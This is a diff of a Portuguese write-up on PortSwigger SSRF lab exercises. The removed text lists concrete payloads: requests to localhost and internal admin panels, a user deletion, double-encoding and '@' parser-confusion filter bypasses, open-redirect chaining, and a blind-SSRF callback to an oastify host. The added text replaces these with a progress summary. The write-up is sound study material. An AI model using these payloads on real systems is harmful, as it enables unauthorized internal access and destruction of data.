@@ -1,471 +1,114 @@
-Durante meus estudos em Web Security, aprofundei meus conhecimentos em Server-Side Request Forgery (SSRF) através dos labs da [PortSwigger Web Security Academy](https://portswigger.net/web-security?utm_source=chatgpt.com).
 
-SSRF foi uma das vulnerabilidades mais interessantes que estudei até agora porque ela muda completamente a forma de pensar sobre aplicações web e infraestrutura interna.
+# SSRF Labs - PortSwigger Web Security Academy
 
-Ao invés de focar apenas em:
-
-* input/output
-* frontend
-* validações simples
-
-SSRF obriga o atacante a entender:
-
-* backend
-* parsing de URL
-* trust relationships
-* rede interna
-* filtros
-* redirects
-* encoding
-* comportamento do servidor
-
-Completei os labs envolvendo:
-
-* SSRF básico
-* SSRF contra localhost
-* SSRF contra sistemas internos
-* blacklist bypass
-* whitelist bypass
-* parser confusion
-* open redirect chaining
-* blind SSRF
+O objetivo é documentar técnicas de exploração, raciocínio e evolução prática em cenários de SSRF.
 
 ---
 
-# O que é SSRF?
+## 📊 Status Geral
 
-SSRF (Server-Side Request Forgery) é uma vulnerabilidade onde o atacante consegue fazer o backend da aplicação realizar requisições HTTP para destinos inesperados.
-
-Fluxo normal:
-
-```text
-Usuário -> Aplicação -> API legítima
-```
-
-Fluxo explorado:
-
-```text
-Usuário -> Aplicação -> localhost/rede interna/admin
-```
+| Lab | Dificuldade | Status |
+|-----|------------|--------|
+| Basic SSRF against the local server | Apprentice | ✅ Solved |
+| Basic SSRF against another back-end system | Apprentice | ✅ Solved |
+| Blind SSRF with out-of-band detection | Practitioner | ❌ Not solved |
+| SSRF with blacklist-based input filter | Practitioner | ✅ Solved |
+| SSRF with filter bypass via open redirection vulnerability | Practitioner | ✅ Solved |
+| Blind SSRF with Shellshock exploitation | Expert | ❌ Not solved |
+| SSRF with whitelist-based input filter | Expert | ❌ Not solved |
 
 ---
 
-# Funcionamento básico da vulnerabilidade
+## 🧠 Overview Técnico
 
-Aplicação vulnerável:
+Durante os laboratórios de SSRF, foram explorados diferentes vetores de ataque contra requisições server-side, incluindo:
 
-```http
-POST /product/stock HTTP/1.1
-
-stockApi=http://stock.weliketoshop.net/product/stock/check?productId=1
-```
-
-Backend vulnerável:
-
-```python
-requests.get(stockApi)
-```
-
-O problema:
-
-* o usuário controla a URL
-* o backend faz a requisição
-* o servidor confia no destino fornecido
+- Acesso a recursos internos (localhost e sistemas back-end)
+- Manipulação de URLs internas via input do usuário
+- Bypass de filtros baseados em blacklist e whitelist
+- Encadeamento de vulnerabilidades (SSRF + Open Redirect)
+- Tentativas de exploração cega (Blind SSRF via OAST)
 
 ---
 
-# SSRF contra localhost
+## 🟢 Labs Resolvidos
 
-Primeiros labs resolvidos:
+### 1. Basic SSRF against the local server (Apprentice)
 
-```http
-stockApi=http://localhost/admin
-```
-
-e:
-
-```http
-stockApi=http://127.0.0.1/admin
-```
-
-Também utilizei:
-
-```http
-stockApi=http://127.1/admin
-```
-
-Porque:
-
-```text
-127.1 == 127.0.0.1
-```
-
-Resultado:
-
-* acesso ao painel administrativo interno
-* bypass de restrições de autenticação
-* acesso privilegiado por requisição local
+Foi possível explorar o parâmetro vulnerável de URL para acessar serviços internos no próprio servidor (`localhost`), permitindo requisições a endpoints restritos.
 
 ---
 
-# Relações de confiança exploradas
+### 2. Basic SSRF against another back-end system (Apprentice)
 
-Aprendi que muitas aplicações:
-
-* confiam em localhost
-* confiam em requests internas
-* possuem painéis administrativos acessíveis apenas internamente
-
-Exemplo:
-
-* firewall protege acesso externo
-* mas SSRF acessa internamente
-
-Fluxo:
-
-```text
-Atacante -> Aplicação vulnerável -> localhost/admin
-```
+O SSRF foi utilizado para interagir com um sistema interno não acessível diretamente pelo usuário, demonstrando comunicação entre serviços internos.
 
 ---
 
-# SSRF contra sistemas internos
+### 3. SSRF with blacklist-based input filter (Practitioner)
 
-Também explorei SSRF em sistemas da rede privada.
+Foi identificado filtro baseado em blacklist bloqueando hosts comuns.
 
-Payload utilizado:
-
-```http
-stockApi=http://192.168.0.2:8080/admin
-```
-
-Objetivo:
-
-* enumeração da rede interna
-* descoberta de hosts ativos
-* descoberta de painéis administrativos internos
-
-Após localizar o host correto:
-
-```http
-stockApi=http://192.168.0.2:8080/admin/delete?username=carlos
-```
-
-Resultado:
-
-* exclusão do usuário `carlos`
-* exploração completa da funcionalidade administrativa
+O bypass foi realizado através de variações de encoding e manipulação de URL, permitindo acessar recursos internos mesmo com restrição.
 
 ---
 
-# URL Encoding
+### 4. SSRF with filter bypass via open redirection (Practitioner)
 
-Durante os labs precisei aprender URL encoding para:
+O ataque foi possível combinando SSRF com Open Redirect.
 
-* bypass de filtros
-* manipulação de parsing
-* double encoding
-
-Exemplo:
-
-```text
-http://localhost/admin
-```
-
-Codificado:
-
-```text
-http%3A%2F%2Flocalhost%2Fadmin
-```
-
-Principais caracteres:
-
-| Codificado | Real |
-| ---------- | ---- |
-| `%3A`      | `:`  |
-| `%2F`      | `/`  |
-| `%3F`      | `?`  |
-| `%26`      | `&`  |
-| `%61`      | `a`  |
+O fluxo permitiu redirecionar a requisição para um endpoint interno, burlando o filtro direto de URL.
 
 ---
 
-# SSRF com Blacklist-Based Filter
+## 🔴 Labs Não Resolvidos (Em progresso)
 
-Nesse cenário:
+### Blind SSRF with out-of-band detection (Practitioner)
 
-* localhost bloqueado
-* 127.0.0.1 bloqueado
-* /admin bloqueado
+O laboratório envolve exploração cega com detecção via canais OAST.
 
-Bypass realizado:
-
-```http
-stockApi=http://127.1/%2561dmin/delete?username=carlos
-```
-
-Explicação:
-
-```text
-%2561 -> %61 -> a
-```
-
-Resultado final:
-
-```text
-/admin
-```
-
-Técnicas utilizadas:
-
-* double URL encoding
-* IP alternative representation
-* filtro bypass
+Ainda em análise de vetores de callback e validação de exfiltração.
 
 ---
 
-# Parser Confusion
+### Blind SSRF with Shellshock exploitation (Expert)
 
-Essa parte foi uma das mais importantes para entender SSRF avançado.
+Exploração envolve execução remota via headers manipulados (Shellshock).
 
-Aprendi que:
-
-* o filtro interpreta a URL de um jeito
-* o backend interpreta de outro
-
-Isso permite bypass usando:
-
-* `@`
-* `#`
-* encoding
-* fragments
-* credentials
+Ainda em estudo sobre payloads e vetores de execução em ambientes CGI.
 
 ---
 
-# SSRF com Whitelist-Based Filter
+### SSRF with whitelist-based input filter (Expert)
 
-A aplicação aceitava apenas:
+Filtro baseado em whitelist dificulta manipulação direta de URL.
 
-```text
-stock.weliketoshop.net
-```
-
-Payload utilizado:
-
-```http
-stockApi=http://stock.weliketoshop.net@127.1/%2561dmin
-```
-
-O filtro enxergava:
-
-```text
-stock.weliketoshop.net
-```
-
-Mas o backend interpretava:
-
-```text
-127.1
-```
-
-Resultado:
-
-* acesso interno liberado
-* bypass completo da whitelist
+Em investigação de bypass via parsing, encoding e inconsistências de validação.
 
 ---
 
-# Double Encoding
+## 🛠️ Técnicas Estudadas
 
-Também utilizei double encoding para bypass de filtros.
-
-Exemplo:
-
-```text
-%2561
-```
-
-Primeira decodificação:
-
-```text
-%61
-```
-
-Segunda decodificação:
-
-```text
-a
-```
-
-Resultado:
-
-* bypass do bloqueio de `/admin`
+- URL manipulation (scheme / host / path abuse)
+- Bypass de blacklist filters
+- Open Redirect chaining
+- Internal network probing via SSRF
+- OAST-based blind detection (teórico em progresso)
+- HTTP request smuggling concepts (parcialmente relacionado)
 
 ---
 
-# SSRF via Open Redirect
+## 🧠 Aprendizados
 
-Um dos labs mais interessantes foi SSRF combinado com Open Redirect.
-
-A aplicação validava apenas URLs pertencentes ao domínio permitido.
-
-Porém existia um endpoint vulnerável:
-
-```text
-/product/nextProduct?path=
-```
-
-Payload utilizado:
-
-```http
-/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
-```
-
-Fluxo da exploração:
-
-1. aplicação aceita endpoint legítimo
-2. backend acessa `/product/nextProduct`
-3. open redirect executa redirecionamento
-4. backend segue redirect automaticamente
-5. request chega ao host interno
-
-Resultado:
-
-* bypass completo da whitelist
-* acesso ao painel interno
-* exclusão do usuário `carlos`
+- SSRF não depende só de input direto, mas de como o backend interpreta URLs
+- Filtros de segurança podem ser contornados via encoding e chaining de vulnerabilidades
+- Blind SSRF exige validação indireta (OAST / callbacks)
+- Combinação de falhas aumenta impacto significativamente
 
 ---
 
-# Blind SSRF
+## 📌 Observação
 
-Também aprendi Blind SSRF.
+Todos os testes foram realizados exclusivamente em ambiente controlado da PortSwigger Web Security Academy para fins educacionais.
 
-Nesse cenário:
-
-* backend faz request
-* resposta não retorna ao atacante
-
-Para detectar exploração utiliza-se:
-
-* Burp Collaborator
-* OAST
-* DNS interaction
-* HTTP callback
-
-Payload exemplo:
-
-```http
-stockApi=http://attacker.oastify.com
-```
-
-Se o backend acessa:
-
-* Collaborator registra interação DNS/HTTP
-
----
-
-# Técnicas importantes aprendidas
-
-## Alternative IP Representation
-
-Bypass utilizando:
-
-* 127.1
-* 2130706433
-* octal IPs
-
----
-
-## URL Parsing Confusion
-
-Diferença entre:
-
-* filtro
-* parser backend
-
----
-
-## Double Encoding
-
-Exploração usando:
-
-* `%2561`
-* múltiplas decodificações
-
----
-
-## Vulnerability Chaining
-
-Combinação de:
-
-* SSRF
-* Open Redirect
-* URL Parsing
-* Internal Network Access
-
----
-
-# Ferramentas utilizadas
-
-* [Burp Suite](https://portswigger.net/burp?utm_source=chatgpt.com)
-* Repeater
-* Burp Collaborator
-* URL Encode/Decode
-* HTTP Requests
-* PortSwigger Labs
-
----
-
-# Principais aprendizados
-
-SSRF não é apenas:
-
-```text
-trocar uma URL
-```
-
-SSRF avançado envolve:
-
-* entender infraestrutura
-* entender backend
-* entender parsing
-* entender trust relationships
-* explorar inconsistências
-
-Aprendi a:
-
-* identificar SSRF
-* explorar localhost
-* explorar rede interna
-* bypassar filtros
-* explorar parsing confusion
-* utilizar redirects
-* utilizar encoding
-* detectar blind SSRF
-
----
-
-# Conclusão
-
-Os labs da [PortSwigger Web Security Academy](https://portswigger.net/web-security?utm_source=chatgpt.com) foram fundamentais para desenvolver entendimento prático sobre SSRF.
-
-Completei laboratórios envolvendo:
-
-* SSRF básico
-* SSRF interno
-* blacklist bypass
-* whitelist bypass
-* open redirect chaining
-* parser confusion
-* blind SSRF
-
-Esses labs me ajudaram a evoluir:
-
-* pensamento ofensivo
-* análise de requests HTTP
-* entendimento de backend
-* exploração de vulnerabilidades reais
-
-Hoje consigo identificar e explorar diferentes cenários SSRF utilizando Burp Suite, Repeater e análise detalhada do fluxo HTTP/backend.
+Este repositório representa progresso contínuo, incluindo laboratórios concluídos e em andamento.
